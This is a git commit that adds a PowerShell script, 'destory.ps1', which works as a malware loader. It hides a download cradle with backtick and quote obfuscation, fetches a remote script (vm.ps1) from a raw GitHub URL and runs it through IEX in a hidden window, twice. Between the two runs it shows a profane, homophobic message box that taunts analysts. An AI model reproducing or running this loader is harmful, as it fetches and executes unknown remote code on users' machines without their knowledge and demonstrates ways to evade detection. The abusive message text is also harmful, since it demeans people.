3e76dea155f2a55553431036163aa63525702ba6
43a1723 <hai1723notgay@gmail.com>
2025-04-10 13:01:31 +0700

    Create destory.ps1

---
+++ s/destory.ps1
@@ -0,0 +1,8 @@
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/vm.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
+[System.Windows.Forms.MessageBox]::Show("Analysis is gay!", "💀 Fuck 💀", "OK", "Warning")
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/vm.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
